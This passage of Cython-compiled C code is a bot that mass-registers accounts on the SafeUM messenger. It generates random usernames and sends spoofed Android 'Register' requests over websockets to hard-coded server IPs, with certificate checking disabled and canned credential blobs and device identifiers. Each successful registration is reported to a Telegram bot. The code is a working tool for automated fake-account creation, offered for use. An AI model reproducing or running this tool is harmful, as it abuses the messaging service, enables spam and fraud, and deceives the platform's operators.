__pyx_n_s_k __pyx_mstate_global->__pyx_n_s_k\n#define __pyx_n_u_locale __pyx_mstate_global->__pyx_n_u_locale\n#define __pyx_n_u_login __pyx_mstate_global->__pyx_n_u_login\n#define __pyx_n_u_m1x __pyx_mstate_global->__pyx_n_u_m1x\n#define __pyx_n_u_m1y __pyx_mstate_global->__pyx_n_u_m1y\n#define __pyx_n_u_m2 __pyx_mstate_global->__pyx_n_u_m2\n#define __pyx_n_u_magicword __pyx_mstate_global->__pyx_n_u_magicword\n#define __pyx_n_u_magicwordhint __pyx_mstate_global->__pyx_n_u_magicwordhint\n#define __pyx_n_s_main __pyx_mstate_global->__pyx_n_s_main\n#define __pyx_n_s_max_workers __pyx_mstate_global->__pyx_n_s_max_workers\n#define __pyx_n_u_message __pyx_mstate_global->__pyx_n_u_message\n#define __pyx_n_s_name __pyx_mstate_global->__pyx_n_s_name\n#define __pyx_n_s_name_2 __pyx_mstate_global->__pyx_n_s_name_2\n#define __pyx_n_u_nickname __pyx_mstate_global->__pyx_n_u_nickname\n#define __pyx_n_s_os __pyx_mstate_global->__pyx_n_s_os\n#define __pyx_n_u_os __pyx_mstate_global->__pyx_n_u_os\n#define __pyx_n_u_osversion __pyx_mstate_global->__pyx_n_u_osversion\n#define __pyx_n_u_password __pyx_mstate_global->__pyx_n_u_password\n#define __pyx_kp_u_pip_install_pyfiglet __pyx_mstate_global->__pyx_kp_u_pip_install_pyfiglet\n#define __pyx_kp_u_pip_install_requests __pyx_mstate_global->__pyx_kp_u_pip_install_requests\n#define __pyx_kp_u_pip_install_websocket_client __pyx_mstate_global->__pyx_kp_u_pip_install_websocket_client\n#define __pyx_n_s_post __pyx_mstate_global->__pyx_n_s_post\n#define __pyx_n_s_print __pyx_mstate_global->__pyx_n_s_print\n#define __pyx_n_s_pyfiglet __pyx_mstate_global->__pyx_n_s_pyfiglet\n#define __pyx_n_u_qwertyuioplkjhgfdsazxcvbnm __pyx_mstate_global->__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm\n#define __pyx_n_u_qwertyuioplkjhgfdsazxcvbnm123456 __pyx_mstate_global->__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm123456\n#define __pyx_n_s_random __pyx_mstate_global->__pyx_n_s_random\n#define __pyx_n_s_recv __pyx_mstate_global->__pyx_n_s_recv\n#define __pyx_n_u_remoteIp __pyx_mstate_global->__pyx_n_u_remoteIp\n#define __pyx_n_u_remotePort __pyx_mstate_global->__pyx_n_u_remotePort\n#define __pyx_n_s_requests __pyx_mstate_global->__pyx_n_s_requests\n#define __pyx_n_s_retry __pyx_mstate_global->__pyx_n_s_retry\n#define __pyx_n_s_send __pyx_mstate_global->__pyx_n_s_send\n#define __pyx_kp_u_sendMessage_chat_id __pyx_mstate_global->__pyx_kp_u_sendMessage_chat_id\n#define __pyx_n_u_sessionId __pyx_mstate_global->__pyx_n_u_sessionId\n#define __pyx_n_u_softwareversion __pyx_mstate_global->__pyx_n_u_softwareversion\n#define __pyx_n_s_spec __pyx_mstate_global->__pyx_n_s_spec\n#define __pyx_n_s_ssl __pyx_mstate_global->__pyx_n_s_ssl\n#define __pyx_n_s_sslopt __pyx_mstate_global->__pyx_n_s_sslopt\n#define __pyx_n_s_start __pyx_mstate_global->__pyx_n_s_start\n#define __pyx_kp_u_status_Success __pyx_mstate_global->__pyx_kp_u_status_Success\n#define __pyx_n_u_subaction __pyx_mstate_global->__pyx_n_u_subaction\n#define __pyx_n_s_submit __pyx_mstate_global->__pyx_n_s_submit\n#define __pyx_n_s_success __pyx_mstate_global->__pyx_n_s_success\n#define __pyx_n_s_sys __pyx_mstate_global->__pyx_n_s_sys\n#define __pyx_n_s_system __pyx_mstate_global->__pyx_n_s_system\n#define __pyx_n_s_t __pyx_mstate_global->__pyx_n_s_t\n#define __pyx_n_s_test __pyx_mstate_global->__pyx_n_s_test\n#define __pyx_kp_u_text __pyx_mstate_global->__pyx_kp_u_text\n#define __pyx_n_s_time __pyx_mstate_global->__pyx_n_s_time\n#define __pyx_n_u_time __pyx_mstate_global->__pyx_n_u_time\n#define __pyx_n_s_token __pyx_mstate_global->__pyx_n_s_token\n#define __pyx_n_u_url __pyx_mstate_global->__pyx_n_u_url\n#define __pyx_n_s_username __pyx_mstate_global->__pyx_n_s_username\n#define __pyx_kp_u_utf_8 __pyx_mstate_global->__pyx_kp_u_utf_8\n#define __pyx_n_s_websocket __pyx_mstate_global->__pyx_n_s_websocket\n#define __pyx_n_s_work __pyx_mstate_global->__pyx_n_s_work\n#define __pyx_kp_u_wss_193_200_173_45_Auth __pyx_mstate_global->__pyx_kp_u_wss_193_200_173_45_Auth\n#define __pyx_kp_u_wss_51_79_208_190_Auth __pyx_mstate_global->__pyx_kp_u_wss_51_79_208_190_Auth\n#define __pyx_int_0 __pyx_mstate_global->__pyx_int_0\n#define __pyx_int_1 __pyx_mstate_global->__pyx_int_1\n#define __pyx_int_12 __pyx_mstate_global->__pyx_int_12\n#define __pyx_int_1000 __pyx_mstate_global->__pyx_int_1000\n#define __pyx_int_8080 __pyx_mstate_global->__pyx_int_8080\n#define __pyx_tuple__2 __pyx_mstate_global->__pyx_tuple__2\n#define __pyx_tuple__4 __pyx_mstate_global->__pyx_tuple__4\n#define __pyx_tuple__5 __pyx_mstate_global->__pyx_tuple__5\n#define __pyx_tuple__7 __pyx_mstate_global->__pyx_tuple__7\n#define __pyx_tuple__8 __pyx_mstate_global->__pyx_tuple__8\n#define __pyx_tuple__9 __pyx_mstate_global->__pyx_tuple__9\n#define __pyx_tuple__10 __pyx_mstate_global->__pyx_tuple__10\n#define __pyx_tuple__13 __pyx_mstate_global->__pyx_tuple__13\n#define __pyx_tuple__19 __pyx_mstate_global->__pyx_tuple__19\n#define __pyx_codeobj__14 __pyx_mstate_global->__pyx_codeobj__14\n/* #### Code section: module_code ### */\n\n\n\n/* Python wrapper */\nstatic PyObject *__pyx_pw_2ej_1work(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/\nstatic PyMethodDef __pyx_mdef_2ej_1work = {"work", (PyCFunction)__pyx_pw_2ej_1work, METH_NOARGS, 0};\nstatic PyObject *__pyx_pw_2ej_1work(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("work (wrapper)", 0);\n  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);\n  __pyx_r = __pyx_pf_2ej_work(__pyx_self);\n\n  /* function exit code */\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2ej_work(CYTHON_UNUSED PyObject *__pyx_self) {\n  PyObject *__pyx_v_username = NULL;\n  PyObject *__pyx_v_con = NULL;\n  PyObject *__pyx_v_gzip = NULL;\n  CYTHON_UNUSED PyObject *__pyx_v_t = NULL;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  int __pyx_t_4;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  PyObject *__pyx_t_9 = NULL;\n  PyObject *__pyx_t_10 = NULL;\n  int __pyx_t_11;\n  Py_ssize_t __pyx_t_12;\n  Py_UCS4 __pyx_t_13;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("work", 1);\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 73, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = NULL;\n  __pyx_t_4 = 0;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_2))) {\n    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);\n    if (likely(__pyx_t_3)) {\n      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);\n      __Pyx_INCREF(__pyx_t_3);\n      __Pyx_INCREF(function);\n      __Pyx_DECREF_SET(__pyx_t_2, function);\n      __pyx_t_4 = 1;\n    }\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_n_u_qwertyuioplkjhgfdsazxcvbnm};\n    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 73, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  }\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_choices); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = PySequence_List(__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm123456); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_GIVEREF(__pyx_t_3);\n  if (__Pyx_PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_3)) __PYX_ERR(0, 74, __pyx_L1_error);\n  __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_k, __pyx_int_12) < 0) __PYX_ERR(0, 74, __pyx_L1_error)\n  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = PyUnicode_Join(__pyx_kp_u_, __pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n  \n  __pyx_t_6 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 73, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_v_username = __pyx_t_6;\n  __pyx_t_6 = 0;\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_9);\n    /*try:*/ {\n\n      \n      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_create_connection); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __pyx_t_3 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_1 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_1);\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_app, __pyx_kp_u_com_safeum_android) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_host, Py_None) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_remoteIp, __pyx_kp_u_193_200_173_45) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      __pyx_t_5 = __Pyx_PyObject_Str(__pyx_int_8080); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_remotePort, __pyx_t_5) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_sessionId, __pyx_kp_u_b6cbb22d_06ca_41ff_8fda_c0ddeb14) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_time, __pyx_kp_u_2023_04_30_12_13_32) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_url, __pyx_kp_u_wss_51_79_208_190_Auth) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_header, __pyx_t_1) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n      \n      __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 77, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_1);\n      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_CERT_NONE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 77, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_cert_reqs, __pyx_t_5) < 0) __PYX_ERR(0, 77, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_sslopt, __pyx_t_1) < 0) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n      \n      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 76, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_1);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_v_con = __pyx_t_1;\n      __pyx_t_1 = 0;\n\n      \n      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_con, __pyx_n_s_send); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_dumps); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_2 = __Pyx_PyDict_NewPresized(16); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_action, __pyx_n_u_Register) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_subaction, __pyx_n_u_Desktop) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_locale, __pyx_n_u_en_GB) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_gmt, __pyx_kp_u_02) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      __pyx_t_10 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_m1x, __pyx_kp_u_503c73d12b354f86ff9706b211470438) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_m1y, __pyx_kp_u_6387ae32b7087257452ae27fc8a925dd) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_m2, __pyx_kp_u_219d1d9b049550f26a6c7b7914a44da1) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_iv, __pyx_n_u_e38cb9e83aef6ceb60a7a71493317903) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_message, __pyx_kp_u_0d99759f972c527722a18a74b3e0b3c6) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_password, __pyx_t_10) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_10 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_m1x, __pyx_kp_u_04eb364e4ef79f31f3e95df2a956e9c7) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_m1y, __pyx_n_u_ef1608faa151cb7989b0ba7f57b39822) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_m2, __pyx_kp_u_4b4d1468bfaf01a82c574ea71c44052d) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_iv, __pyx_n_u_b31d0165dde6b3d204263d6ea4b96789) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_10, __pyx_n_u_message, __pyx_kp_u_8c6ec7ce0b9108d882bb076be6e49fe2) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_magicword, __pyx_t_10) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_magicwordhint, __pyx_kp_u_0000) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n\n      \n      __pyx_t_10 = __Pyx_PyObject_Str(__pyx_v_username); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 79, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_login, __pyx_t_10) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_devicename, __pyx_kp_u_Xiaomi_Redmi_Note_8_Pro) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_softwareversion, __pyx_kp_u_1_1_0_1380) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_nickname, __pyx_n_u_hvtctchnjvfxfx) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_os, __pyx_n_u_AND) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_deviceuid, __pyx_n_u_c72d110c1ae40d50) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_devicepushuid, __pyx_kp_u_dxT6B6Solm0_APA91bHqL8wxzlyKHck) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_osversion, __pyx_kp_u_and_11_0_0) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_id, __pyx_kp_u_1734805700) < 0) __PYX_ERR(0, 78, __pyx_L3_error)\n      __pyx_t_10 = NULL;\n      __pyx_t_4 = 0;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_5))) {\n        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_5);\n        if (likely(__pyx_t_10)) {\n          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);\n          __Pyx_INCREF(__pyx_t_10);\n          __Pyx_INCREF(function);\n          __Pyx_DECREF_SET(__pyx_t_5, function);\n          __pyx_t_4 = 1;\n        }\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_t_2};\n        __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);\n        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 78, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_6);\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      }\n      __pyx_t_5 = NULL;\n      __pyx_t_4 = 0;\n      #if CYTHON_UNPACK_METHODS\n      if (likely(PyMethod_Check(__pyx_t_3))) {\n        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);\n        if (likely(__pyx_t_5)) {\n          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);\n          __Pyx_INCREF(__pyx_t_5);\n          __Pyx_INCREF(function);\n          __Pyx_DECREF_SET(__pyx_t_3, function);\n          __pyx_t_4 = 1;\n        }\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_t_6};\n        __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 78, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_1);\n        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      }\n      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n      \n      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_decompress); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 80, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_con, __pyx_n_s_recv); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 80, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      __pyx_t_10 = NULL;\n      __pyx_t_4 = 0;\n      #if CYTHON_UNPACK_METHODS\n      if (likely(PyMethod_Check(__pyx_t_2))) {\n        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_2);\n        if (likely(__pyx_t_10)) {\n          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);\n          __Pyx_INCREF(__pyx_t_10);\n          __Pyx_INCREF(function);\n          __Pyx_DECREF_SET(__pyx_t_2, function);\n          __pyx_t_4 = 1;\n        }\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};\n        __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);\n        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 80, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n      }\n      __pyx_t_2 = NULL;\n      __pyx_t_4 = 0;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_6))) {\n        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);\n        if (likely(__pyx_t_2)) {\n          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);\n          __Pyx_INCREF(__pyx_t_2);\n          __Pyx_INCREF(function);\n          __Pyx_DECREF_SET(__pyx_t_6, function);\n          __pyx_t_4 = 1;\n        }\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_5};\n        __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);\n        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 80, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_3);\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      }\n      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_decode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 80, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_3 = NULL;\n      __pyx_t_4 = 0;\n      #if CYTHON_UNPACK_METHODS\n      if (likely(PyMethod_Check(__pyx_t_6))) {\n        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);\n        if (likely(__pyx_t_3)) {\n          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);\n          __Pyx_INCREF(__pyx_t_3);\n          __Pyx_INCREF(function);\n          __Pyx_DECREF_SET(__pyx_t_6, function);\n          __pyx_t_4 = 1;\n        }\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_kp_u_utf_8};\n        __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);\n        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 80, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_1);\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      }\n      __pyx_v_gzip = __pyx_t_1;\n      __pyx_t_1 = 0;\n\n      \n      __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_status_Success, __pyx_v_gzip, Py_EQ)); if (unlikely((__pyx_t_11 < 0))) __PYX_ERR(0, 81, __pyx_L3_error)\n      if (__pyx_t_11) {\n\n        \n        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_success); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_1);\n        __pyx_t_6 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 82, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_6);\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n        if (PyDict_SetItem(__pyx_d, __pyx_n_s_success, __pyx_t_6) < 0) __PYX_ERR(0, 82, __pyx_L3_error)\n        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n        \n        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 83, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_1);\n        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 83, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_3);\n        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n        \n        __pyx_t_1 = PyTuple_New(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_1);\n        __pyx_t_12 = 0;\n        __pyx_t_13 = 127;\n        __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);\n        __pyx_t_12 += 28;\n        __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);\n        PyTuple_SET_ITEM(__pyx_t_1, 0, 